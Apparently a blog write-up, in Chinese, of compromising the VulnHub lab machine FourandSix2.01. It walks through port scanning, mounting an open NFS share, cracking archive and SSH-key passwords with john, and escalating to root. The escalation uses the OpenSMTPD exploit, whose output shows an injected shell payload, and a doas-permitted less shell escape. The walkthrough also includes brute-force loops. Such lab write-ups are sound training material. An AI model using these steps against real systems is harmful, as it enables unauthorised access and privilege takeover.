+++
date = '2026-11-07T11:48:38+08:00'
draft = false
title = '[VulnHub靶机]FourandSix2.01渗透记录'
tags = ['渗透','Vulnhub','NFS','John','Kernel','密码爆破','OpenBSD']
+++

## 主机发现与端口扫描

攻击机IP: 10.10.10.3
靶机IP: 10.10.10.11

```shell
┌──(kali㉿kali)-[~/FourandSix2.01]
└─$ sudo arp-scan -l                       
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 10.10.10.3
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.2      00:50:56:fc:41:2a       VMware, Inc.
10.10.10.11     00:0c:29:dd:cd:6e       VMware, Inc.
10.10.10.254    00:50:56:e0:f0:a6       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.971 seconds (129.88 hosts/sec). 4 responded
```

探测开放端口

```shell
┌──(kali㉿kali)-[~/FourandSix2.01]
└─$ sudo nmap --min-rate 10000 -p- 10.10.10.11
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-07 11:52 +0800
Warning: 10.10.10.11 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.11
Host is up (0.00027s latency).
Not shown: 61604 filtered tcp ports (no-response), 3929 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
111/tcp open  rpcbind
MAC Address: 00:0C:29:DD:CD:6E (VMware)

Nmap done: 1 IP address (1 host up) scanned in 71.26 seconds
```

深入扫描, 注意到靶机存在nfs服务

```shell
┌──(kali㉿kali)-[~/FourandSix2.01]
└─$ sudo nmap -sT -sV -sC -O -p22,111 10.10.10.11
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-07 11:54 +0800
Nmap scan report for 10.10.10.11
Host is up (0.00057s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 ef:3b:2e:cf:40:19:9e:bb:23:1e:aa:24:a1:09:4e:d1 (RSA)
|   256 c8:5c:8b:0b:e1:64:0c:75:c3:63:d7:b3:80:c9:2f:d2 (ECDSA)
|_  256 61:bc:45:9a:ba:a5:47:20:60:13:25:19:b0:47:cb:ad (ED25519)
111/tcp open  rpcbind 2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3         2049/tcp   nfs
|   100003  2,3         2049/udp   nfs
|   100005  1,3          857/udp   mountd
|_  100005  1,3          925/tcp   mountd
MAC Address: 00:0C:29:DD:CD:6E (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): OpenBSD 6.X|4.X|5.X|7.X|3.X (98%)
OS CPE: cpe:/o:openbsd:openbsd:6 cpe:/o:openbsd:openbsd:4.4 cpe:/o:openbsd:openbsd:5 cpe:/o:openbsd:openbsd:7 cpe:/o:openbsd:openbsd:3
Aggressive OS guesses: OpenBSD 6.0 - 6.4 (98%), OpenBSD 6.1 (96%), OpenBSD 4.4 - 4.5 (94%), OpenBSD 4.2 - 4.4 (94%), OpenBSD 5.0 - 5.8 (94%), OpenBSD 7.1 - 7.5 (93%), OpenBSD 5.5 (93%), OpenBSD 6.8 (91%), OpenBSD 3.8 - 4.7 (91%), OpenBSD 4.6 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.17 seconds
```

漏洞扫描一无所获

```shell
┌──(kali㉿kali)-[~/FourandSix2.01]
└─$ sudo nmap --script=vuln -p22,111 10.10.10.11
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-07 11:56 +0800
Nmap scan report for 10.10.10.11
Host is up (0.00035s latency).

PORT    STATE SERVICE
22/tcp  open  ssh
111/tcp open  rpcbind
MAC Address: 00:0C:29:DD:CD:6E (VMware)

Nmap done: 1 IP address (1 host up) scanned in 10.99 seconds
```

进行UPD扫描

```shell
┌──(kali㉿kali)-[~/FourandSix2.01]
└─$ sudo nmap -sU --min-rate 10000 10.10.10.11
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-07 11:58 +0800
Nmap scan report for 10.10.10.11
Host is up (0.00014s latency).
Not shown: 899 open|filtered udp ports (no-response), 99 closed udp ports (port-unreach)
PORT     STATE SERVICE
111/udp  open  rpcbind
2049/udp open  nfs
MAC Address: 00:0C:29:DD:CD:6E (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.95 seconds
```

## NFS信息收集

使用showmount查看NFS开放目录

```shell
┌──(kali㉿kali)-[~/FourandSix2.01]
└─$ showmount -e 10.10.10.11                  
Export list for 10.10.10.11:
/home/user/storage (everyone)
```

将其挂载到攻击机中

```shell
┌──(kali㉿kali)-[~/FourandSix2.01]
└─$ sudo mkdir /mnt/nfs
                                                                                                                                                                       
┌──(kali㉿kali)-[~/FourandSix2.01]
└─$ sudo mount -t nfs 10.10.10.11:/home/user/storage /mnt/nfs -o nolock
```

列出文件, 发现一个备份压缩包

```shell
┌──(kali㉿kali)-[~/FourandSix2.01]
└─$ ls -lah /mnt/nfs 
总计 68K
drwxr-xr-x 2 kali kali  512 2018年10月29日 .
drwxr-xr-x 3 root root 4.0K 11月 7日 12:04 ..
-rw-r--r-- 1 kali kali  61K 2018年10月29日 backup.7z
```

将备份文件夹拷贝出来

```shell
┌──(kali㉿kali)-[~/FourandSix2.01]
└─$ cp /mnt/nfs/backup.7z ./
```

拷贝后卸载挂载

```shell
┌──(kali㉿kali)-[~/FourandSix2.01]
└─$ sudo umount /mnt/nfs
```

解压, 发现需要解压密码

```shell
┌──(kali㉿kali)-[~/FourandSix2.01]
└─$ 7z x backup.7z 

7-Zip 26.03 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-09-03
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:4096, ASM

Scanning the drive for archives:
1 file, 62111 bytes (61 KiB)

Extracting archive: backup.7z
--
Path = backup.7z
Type = 7z
Physical Size = 62111
Headers Size = 303
Method = LZMA2:16 7zAES
Solid = +
Blocks = 1

    
Enter password (will not be echoed):
```

## 压缩包密码爆破

使用7z2john提取压缩包密码哈希

```shell
┌──(kali㉿kali)-[~/FourandSix2.01]
└─$ 7z2john backup.7z > pass_hash.txt
```

使用john爆破, 发现密码为`chocolate`

```shell
┌──(kali㉿kali)-[~/FourandSix2.01]
└─$ john pass_hash.txt -w=/usr/share/wordlists/rockyou.txt         
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 0 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Cost 4 (data size penalty) is 9488 for all loaded hashes
Will run 8 OpenMP threads
Note: Passwords longer than 28 rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
chocolate        (backup.7z)     
1g 0:00:00:00 DONE (2026-11-07 12:46) 3.226g/s 206.5p/s 206.5c/s 206.5C/s 123456..charlie
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## SSH私钥破解

使用得到的密码解压, 得到一堆图片和id_rsa和id_rsa.pub文件

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/FourandSix2.01/%E8%A7%A3%E5%8E%8B%E5%8E%8B%E7%BC%A9%E5%8C%85.avif)

读取id_rsa, 发现是ssh私钥

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCmv/BkXU             
N5gfqui9Z/92KAAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDClNemaX//             
nOugJPAWyQ1aDMgfAS8zrJh++hNeMGCo+TIm9UxVUNwc6vhZ8apKZHOX0Ht+MlHLYdkbwS             
inmCRmOkm2JbMYA5GNBG3fTNWOAbhd7dl2GPG7NUD+zhaDFyRk5gTqmuFumECDAgCxzeE8             
r9jBwfX73cETemexWKnGqLey0T56VypNrjvueFPmmrWCJyPcXtoLNQDbbdaWwJPhF0gKGr             
rWTEZo0NnU1lMAnKkiooDxLFhxOIOxRIXWtDtc61cpnnJHtKeO+9wL2q7JeUQB00KLs9/i             
RwV6b+kslvHaaQ4TR8IaufuJqmICuE4+v7HdsQHslmIbPKX6HANnAAADwAO39g1ZtgarNJ             
4hcnHTgx/DLgDeet1AhvBBsVjk94i8WLhy0luUvigJcMwHY6MgxL/ZNJfe3cZZ2/Rpo5g5             
j5fzQ8vBHlglN9Z1GPVmeKdUHpRzrLFuARQOitYiWn9suwVafhgTS1hAof3Fqsik3pogEn             
qp9pm39lalPVNgNVj6HCr2iJ0iq/MXjAmbgYxvpYXhzjyGzfPRlsw3y1T0pIxq3y9AzVBz             
BCWF9x/GS1mXiDvGbNyb21ymn+NJq1eZKBN2LGJOHV2v+GGBkRTIYDsUpRbN56OJgu7Fyk             
sECQIARA3ngs7tJhkGwtU7tIihiw/JlRtNu3GZwEsd5RVyX6cK8xGuaqlUulmm5E1CnxXz             
3zj8MNhZtpDJaTpda83BhkxkSYb2svJ5rqO8HTYX2XtvPBEAN3U/dbcYVwNIdJ77TmckvS
tqvWi+DlZ6SL5Jlsj3WIFwXrmSIUQATA0jcF4d/FOoYOFTAQJ1y2pm97Q8UCErizu+SjfR
yQ7Q7QERsuAWBKthTGWkmzWKTYG8cpKso4lwbbjKJapfovEDtJgtFZpaX2+2YMMBx5AtaU             
wNJShNYfIan4d8E2l6R77bBjqff4Qk1EMZzyXhG/Qe63buiCpUk6EevAf5Z2LXHJa4JYW3             
PVcSXL3pbAOKEt6c36Q7CMHLmgOR9Be9wU/G+0FkDhdcgdkfOHaROfbK+RLhZ9tMO2peFP             
POba2/Mw/kIK2Tepw7dQMvZ8KU+rBISeTE0YoSNYpt5A7ClskeLsXh9KCA/6Glnw+xKS+K
ewK2ooDck0EwHUmVQqC4qkXzbPbcj37WwMO3mzcQo7MARluOX8Y5b6JReqdhzvM5S7/uOb
cIblXwq9h71gTPirzhnn9QaJ/DnbGX4Ww7m8nkFkf9qwghWM+vKMjTxGSFHFXubk8l+5CG
fAOYC1igZMjKO5+2u60LMhtPjkGdUMbq0hv2FCxZW1ajlGwZIYWs2MLW7LGVSwC7re+fM2
1RaMxWvn73VjjooB+7hexe7l35mr5TyaZcQKCtJSNQRrGsSxHLUTEtvLY9FHOCnLgcsUzi
Tm826t9dvsrYHJh8W/wSqSYQ9t1niLg2MulioK6H8FTDAupkhZUkkbL0FEbe+Dl3cIeUW6
nXgaf6F+9tQHNQCI9QT1a/kGSGgQRRjuSdmVZieqdafJ7jHavLjzjcsiKQtjzkyaCp1hpa
dS6IZqF9DzlbtJRNlrO6Tq3j7gtL4DCURx2Jq13JO1hWDffIyrRZfgGeovGK/UAbTeTQ9M
rPy1AS6A==
-----END OPENSSH PRIVATE KEY-----
```

读取id_rsa.pub, 注意到用户名为user

```text
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDClNemaX//nOugJPAWyQ1aDMgfAS8zrJh++hNeMGCo+TIm9UxVUNwc6vhZ8apKZHOX0Ht+MlHLYdkbwSinmCRmOkm2JbMYA5GNBG3fTNWOAbhd7dl2GPG7NUD+zhaDFyRk5gTqmuFumECDAgCxzeE8r9jBwfX73cETemexWKnGqLey0T56VypNrjvueFPmmrWCJyPcXtoLNQDbbdaWwJPhF0gKGrrWTEZo0NnU1lMAnKkiooDxLFhxOIOxRIXWtDtc61cpnnJHtKeO+9wL2q7JeUQB00KLs9/iRwV6b+kslvHaaQ4TR8IaufuJqmICuE4+v7HdsQHslmIbPKX6HANn user@fourandsix2
```

使用用户名`user`和私钥登录ssh, 却发现要求我们输入密码短语

```shell
┌──(kali㉿kali)-[~/FourandSix2.01]
└─$ ssh user@10.10.10.11 -i id_rsa                                     
The authenticity of host '10.10.10.11 (10.10.10.11)' can't be established.
ED25519 key fingerprint is: SHA256:bYL1jAzqEuvAJUa0fNrhsGN1637L223ZIavvbfsCL0g
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.11' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa':
```

使用ssh2john将私钥转换为john可处理的格式

```shell
┌──(kali㉿kali)-[~/FourandSix2.01]
└─$ ssh2john id_rsa > ssh_hash.txt
```

使用John爆破, 发现短语为12345678

```shell
┌──(kali㉿kali)-[~/FourandSix2.01]
└─$ john ssh_hash.txt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
12345678         (id_rsa)     
1g 0:00:00:00 DONE (2026-11-07 12:58) 1.250g/s 80.00p/s 80.00c/s 80.00C/s 123456..charlie
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

重新登录SSH并输入密码短语, 成功登录

```shell
┌──(kali㉿kali)-[~/FourandSix2.01]
└─$ ssh user@10.10.10.11 -i id_rsa
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa': 
Last login: Mon Oct 29 13:53:51 2018 from 192.168.1.114
OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

fourandsix2$ 
```

## 权限提升

### 方法1: 内核提权

查看系统信息

```shell
fourandsix2$ uname -a
OpenBSD fourandsix2.localdomain 6.4 GENERIC#349 amd64
```

使用searchsploit搜索漏洞

```shell
┌──(kali㉿kali)-[~/FourandSix2.01]
└─$ searchsploit OpenBSD 6.4
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSMTPD 6.4.0 < 6.6.1 - Local Privilege Escalation + Remote Code Execution                                                         | openbsd/remote/48051.pl         
OpenSMTPD < 6.6.3p1 - Local Privilege Escalation + Remote Code Execution                                                             | openbsd/remote/48140.c
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

使用第一个  
靶机上没有wget和curl, 那我们可以用vi创建脚本并直接复制粘贴过去

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/FourandSix2.01/%E7%B2%98%E8%B4%B4exp.avif)

运行后即可提权

```shell
fourandsix2$ perl exp.pl LPE
raptor_opensmtpd.pl - LPE and RCE in OpenBSD's OpenSMTPD
Copyright (c) 2020 Marco Ivaldi <raptor@0xdeadbeef.info>

< 220 fourandsix2.localdomain ESMTP OpenSMTPD
> HELO fnord
< 250 fourandsix2.localdomain Hello fnord [127.0.0.1], pleased to meet you
> MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;>
< 250 2.0.0: Ok
> RCPT TO:<root>
< 250 2.1.5 Destination address valid: Recipient ok
> DATA
< 354 Enter mail, end with "." on a line by itself
< 250 2.0.0: 77f7c867 Message accepted for delivery

Payload sent, please wait 5 seconds...
-rwsrwxrwx  1 root  wheel  7417 Nov  7 14:14 /usr/local/bin/pwned
fourandsix2# whoami
root
```

### 方法2: less提权

读取`/etc/doas.conf`(类似于`sudo -l`), 发现我们可以无密码以root身份执行less查看authlog

```shell
fourandsix2$ cat /etc/doas.conf
permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog
permit nopass keepenv root as root
```

执行命令

```shell
fourandsix2$ doas /usr/bin/less /var/log/authlog
```

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/FourandSix2.01/%E8%BF%9B%E5%85%A5less.avif)

按下`v`键可进入vi

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/FourandSix2.01/%E8%BF%9B%E5%85%A5vi.avif)

输入命令`:!sh`, 即可创建一个shell会话, 此时为root权限

```shell
fourandsix2# whoami
root
```

### 读取flag

```shell
fourandsix2# cd /root
fourandsix2# ls
.Xdefaults .cshrc     .cvsrc     .forward   .login     .profile   .ssh       flag.txt
fourandsix2# cat flag.txt
```

```text
Nice you hacked all the passwords!

Not all tools worked well. But with some command magic...:
cat /usr/share/wordlists/rockyou.txt|while read line; do 7z e backup.7z -p"$line" -oout; if grep -iRl SSH; then echo $line; break;fi;done

cat /usr/share/wordlists/rockyou.txt|while read line; do if ssh-keygen -p -P "$line" -N password -f id_rsa; then echo $line; break;fi;done


Here is the flag:
acd043bc3103ed3dd02eee99d5b0ff42
```
